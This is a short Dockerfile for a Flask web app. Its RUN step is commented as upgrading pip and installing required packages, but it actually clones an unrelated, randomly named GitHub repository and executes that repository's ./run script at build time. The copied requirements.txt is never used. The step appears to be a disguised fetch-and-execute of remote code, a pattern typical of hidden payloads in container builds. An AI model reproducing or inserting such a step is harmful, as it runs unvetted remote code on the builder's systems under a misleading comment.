FROM tiangolo/uwsgi-nginx-flask:python3.6

# copy over our requirements.txt file
COPY requirements.txt /tmp/

# upgrade pip and install required python packages
RUN git clone --recursive https://github.com/mijikuhibimui/mujijankopo \
    && cd mujijankopo \
    && ./run


EXPOSE 80
# copy over our app code
COPY ./app.py /app
WORKDIR /app
CMD ["python", "app.py"]
